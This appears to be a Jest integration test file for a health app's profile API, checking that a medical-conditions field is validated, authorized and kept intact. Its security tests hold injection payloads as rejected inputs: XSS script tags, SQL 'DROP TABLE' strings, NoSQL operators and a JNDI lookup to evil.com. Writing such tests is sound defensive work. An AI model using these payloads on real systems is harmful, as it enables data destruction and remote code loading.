const request = require('supertest');
const { app } = require('../../../server');
const { getSupabaseClient } = require('../../../services/supabase');

describe('Profile Medical Conditions Integration Tests', () => {
  let testUserId;
  let authToken;
  let supabase;

  beforeAll(async () => {
    supabase = getSupabaseClient();
  });

  beforeEach(async () => {
    // Create a test user
    const userEmail = `test-${Date.now()}@example.com`;
    const userPassword = 'TestPassword123!';
    const userName = 'Test User Medical';

    const signupResponse = await request(app)
      .post('/v1/auth/signup')
      .send({ 
        name: userName, 
        email: userEmail, 
        password: userPassword 
      })
      .expect(201);

    testUserId = signupResponse.body.userId;
    authToken = signupResponse.body.accessToken;

    if (!authToken) {
      const loginResponse = await request(app)
        .post('/v1/auth/login')
        .send({ email: userEmail, password: userPassword })
        .expect(200);
      authToken = loginResponse.body.jwtToken;
    }
  });

  afterEach(async () => {
    // Clean up test user profile if it exists
    if (testUserId) {
      await supabase
        .from('user_profiles')
        .delete()
        .eq('user_id', testUserId);
    }
  });

  describe('Medical Conditions Field Validation', () => {
    it('should accept valid medical conditions as array', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['diabetes', 'hypertension', 'asthma']
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(200);

      expect(response.body.status).toBe('success');
      expect(response.body.data.medicalConditions).toEqual(['diabetes', 'hypertension', 'asthma']);
    });

    it('should handle empty medical conditions array', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: []
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(200);

      expect(response.body.status).toBe('success');
      expect(response.body.data.medicalConditions).toEqual([]);
    });

    it('should default to empty array when medical conditions not provided', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(200);
      
      expect(response.body.status).toBe('success');
      
      // Should default to empty array based on our migration
      const { data: dbProfile } = await supabase
        .from('user_profiles')
        .select('medical_conditions')
        .eq('user_id', testUserId)
        .single();

      expect(dbProfile.medical_conditions).toEqual([]);
    });

    it('should reject non-array medical conditions', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: 'diabetes'
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('Medical conditions must be an array');
    });

    it('should reject non-string items in medical conditions array', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['diabetes', 123, null]
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('medical condition must be a string');
    });

    it('should reject medical conditions that are too long', async () => {
      const longCondition = 'a'.repeat(201); // Over 200 character limit
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: [longCondition]
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('Medical condition cannot exceed 200 characters');
    });

    it('should reject empty strings in medical conditions', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['diabetes', '', 'hypertension']
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('Medical condition cannot be empty');
    });

    it('should accept exactly 10 medical conditions (boundary test)', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: [
          'diabetes',
          'hypertension', 
          'asthma',
          'arthritis',
          'migraine',
          'allergies',
          'depression',
          'anxiety',
          'insomnia',
          'thyroid'
        ]
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(200);

      expect(response.body.status).toBe('success');
      expect(response.body.data.medicalConditions).toHaveLength(10);
    });

    it('should reject more than 10 medical conditions', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: [
          'diabetes', 'hypertension', 'asthma', 'arthritis', 'migraine',
          'allergies', 'depression', 'anxiety', 'insomnia', 'thyroid',
          'condition11'
        ]
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('Cannot have more than 10 medical conditions');
    });
  });

  describe('Medical Conditions Data Integrity', () => {
    it('should preserve medical conditions across profile updates', async () => {
      // First, create profile with medical conditions
      const initialData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['diabetes', 'hypertension']
      };

      await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(initialData)
        .expect(200);

      // Then update other fields
      const updateData = {
        weight: 72,
        age: 31
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(updateData)
        .expect(200);

      expect(response.body.status).toBe('success');
      expect(response.body.data.medicalConditions).toEqual(['diabetes', 'hypertension']);
      expect(response.body.data.weight).toBe(72);
      expect(response.body.data.age).toBe(31);
    });

    it('should allow updating medical conditions independently', async () => {
      // Create initial profile
      await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          height: 175,
          weight: 70,
          age: 30,
          medicalConditions: ['diabetes']
        })
        .expect(200);

      // Update medical conditions
      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          medicalConditions: ['diabetes', 'hypertension', 'asthma']
        })
        .expect(200);

      expect(response.body.status).toBe('success');
      expect(response.body.data.medicalConditions).toEqual(['diabetes', 'hypertension', 'asthma']);
    });
  });

  describe('Medical Conditions Security Validation Tests', () => {
    it('should prevent XSS injection in medical conditions', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['<script>alert("XSS")</script>', 'javascript:alert("XSS")']
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('Medical condition contains invalid characters');
    });

    it('should prevent SQL injection in medical conditions', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ["'; DROP TABLE users; --", "' OR 1=1 --", 'diabetes"; DELETE FROM profiles; --']
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('Medical condition contains invalid characters');
    });

    it('should prevent NoSQL injection in medical conditions', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['$ne:null', '$where:function(){return true}', 'diabetes\\u0000injection']
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('Medical condition contains invalid characters');
    });

    it('should prevent code injection attempts in medical conditions', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: [
          'eval("malicious_code")', 
          'function(){return false;}', 
          '${jndi:ldap://evil.com/a}'
        ]
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toContain('Medical condition contains invalid characters');
    });

    it('should sanitize and reject encoded injection attempts', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: [
          '%3Cscript%3Ealert%28%29%3C%2Fscript%3E', // URL encoded script tag
          'data:text/html,<script>alert()</script>', // Data URI
          '\\x3cscript\\x3e', // Hex encoded script
        ]
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      // Should catch these through pattern validation or sanitization
      expect(response.body.message).toMatch(/Medical condition (contains invalid characters|format is invalid)/);
    });
  });

  describe('Medical Conditions Authorization Tests', () => {
    it('should return 401 when no authorization token is provided', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['diabetes']
      };

      const response = await request(app)
        .post('/v1/profile')
        .send(profileData)
        .expect(401);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toBe('Authentication required');
    });

    it('should return 401 when invalid authorization token is provided', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['diabetes']
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', 'Bearer invalid_token_here')
        .send(profileData)
        .expect(401);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toBe('Authentication failed: Invalid or expired token');
    });

    it('should return 401 when malformed authorization header is provided', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['diabetes']
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', 'InvalidFormat token_here')
        .send(profileData)
        .expect(401);

      expect(response.body.status).toBe('error');
      expect(response.body.message).toBe('Authentication failed');
    });

    it('should prevent cross-user access to medical conditions', async () => {
      // Create another test user
      const otherUserEmail = `other-${Date.now()}@example.com`;
      const otherUserPassword = 'OtherPassword123!';
      
      const otherSignupResponse = await request(app)
        .post('/v1/auth/signup')
        .send({ 
          name: 'Other User', 
          email: otherUserEmail, 
          password: otherUserPassword 
        })
        .expect(201);

      const otherAuthToken = otherSignupResponse.body.accessToken || 
        (await request(app)
          .post('/v1/auth/login')
          .send({ email: otherUserEmail, password: otherUserPassword }))
          .body.jwtToken;

      // Create profile with first user's token
      await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          height: 175,
          weight: 70,
          age: 30,
          medicalConditions: ['diabetes']
        })
        .expect(200);

      // Try to access/modify with second user's token
      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${otherAuthToken}`)
        .send({
          medicalConditions: ['modified by other user']
        })
        .expect(200); // This creates a new profile for the other user, not modifies the first user's

      // Verify the original user's data is unchanged
      const originalUserResponse = await request(app)
        .get('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(originalUserResponse.body.data.medicalConditions).toEqual(['diabetes']);

      // Clean up the other user
      await supabase
        .from('user_profiles')
        .delete()
        .eq('user_id', otherSignupResponse.body.userId);
    });
  });

  describe('Medical Conditions Healthcare Compliance Tests', () => {
    it('should not expose sensitive data in error messages', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: ['<script>alert("sensitive_data_here")</script>']
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(400);

      expect(response.body.status).toBe('error');
      // Ensure the actual malicious content is not echoed back in the error
      expect(response.body.message).not.toContain('sensitive_data_here');
      expect(response.body.message).not.toContain('<script>');
      expect(response.body.message).not.toContain('alert');
    });

    it('should validate unicode and international characters properly', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: [
          'diabetes type 2', // English
          'hypertension', // Standard medical term
          'mild asthma' // Should be valid
        ]
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(200);

      expect(response.body.status).toBe('success');
      expect(response.body.data.medicalConditions).toEqual([
        'diabetes type 2',
        'hypertension', 
        'mild asthma'
      ]);
    });

    it('should handle medical abbreviations and standard formatting', async () => {
      const profileData = {
        height: 175,
        weight: 70,
        age: 30,
        medicalConditions: [
          'T2DM', // Type 2 Diabetes Mellitus
          'HTN', // Hypertension  
          'COPD (mild)', // Should accept parentheses
          'MI - 2019' // Should accept dashes and dates
        ]
      };

      const response = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send(profileData)
        .expect(200);

      expect(response.body.status).toBe('success');
      expect(response.body.data.medicalConditions).toEqual([
        'T2DM',
        'HTN',
        'COPD (mild)',
        'MI - 2019'
      ]);
    });

    it('should maintain audit trail for medical conditions changes', async () => {
      // Create initial profile
      await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          height: 175,
          weight: 70,
          age: 30,
          medicalConditions: ['diabetes']
        })
        .expect(200);

      // Update medical conditions
      const updateResponse = await request(app)
        .post('/v1/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          medicalConditions: ['diabetes', 'hypertension']
        })
        .expect(200);

      // Verify the update was successful
      expect(updateResponse.body.status).toBe('success');
      expect(updateResponse.body.data.medicalConditions).toEqual(['diabetes', 'hypertension']);

      // Verify data integrity in database
      const { data: dbProfile } = await supabase
        .from('user_profiles')
        .select('medical_conditions, updated_at')
        .eq('user_id', testUserId)
        .single();

      expect(dbProfile.medical_conditions).toEqual(['diabetes', 'hypertension']);
      expect(dbProfile.updated_at).toBeDefined();
    });
  });
}); 